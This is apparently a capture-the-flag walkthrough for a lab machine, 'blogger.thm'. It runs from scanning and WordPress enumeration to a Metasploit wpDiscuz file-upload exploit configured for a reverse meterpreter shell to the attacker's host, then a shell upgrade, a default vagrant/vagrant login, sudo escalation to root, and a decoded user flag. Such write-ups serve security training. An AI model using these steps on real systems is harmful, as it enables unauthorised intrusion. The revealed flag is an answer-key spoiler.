=================

1. Network scan the subset to find target machine IP address

 - IP FOUND: Nmap scan report for ubuntu-xenial (192.168.1.173)

2. Port Scan target machine to find open services

	PORTS FOUND:

		22 - SSH
		80 - HTTP Webserver

3. Visit webpage (Added "blogger.thm" to /etc/hosts)

4. Started gobuster on endpoint. Resulting endpoints saved in gobuster.txt

5. Wordpress instance found on /assets/fonts/blog

6. Wappalyzer shows that this application is running wordpress

7. Running WPScan against the endpoint. Resuls saved into wpscan.txt

8. From this, we found two out of date plugins
	- akismet 4.0.8
	- wpdiscuz 7.0.4 (This is vulnerable to abitrary file upload)

9. Metasploit has a exploit module for the above vulnerability

	exploit/unix/webapp/wp_wpdiscuz_unauthenticated_file_upload

	RHOST = http://blogger.thm/assets/fonts/blog/
	BLOGPOST = ?p=29
	LHOST = 192.168.1.168
	LPORT = 4444

10. This opens up a meterpreter shell on the remote host. (Unprivledged as www-data with /bin/sh)

13. From here we need to upgrade the shell, we can do this with a python

	python3 -c 'import pty; pty.spawn("/bin/bash")'

12. Next we are going to enumerate the users on the system:
	
	james
	ubuntu
	vagrant

13. Looking into the home directory of the user james (/user/james), we can find a user.txt file. The permissions on the file are -rw------- or 600. Which means this directory is not accessible through the www-data user. It will only be accessible if we become the james user or we achieve root access.

14. Seeing that we have a vagrant user, we can attempt to find default credentials that come with that service. With a quick google search, we can find that vagrant/vagrant are the default credentials. We are able to switch users sucessfully with

	su vagrant
	password: vagrant 

15. From there we can view all of the sudo permissions that the vagrant has with

	sudo -l

    and we can see that we have no password accesss to all commands on the system

16. So if we run sudo escalation with

	sudo -i

    we will be elevated to the root user

16. Now that we are reached root user, we can aquire both user.txt and the root.txt file from the home directory of the james and root user respectively.

user.txt:

ZmxhZ3tZMHVfRCFEXzE3IDopfQ==

which is base64 encoded, so it translates to

flag{Y0u_D!D_17 :)}

----------
root.txt

which is base64 encoded (known due to the == at the end) so we can translate it to ...
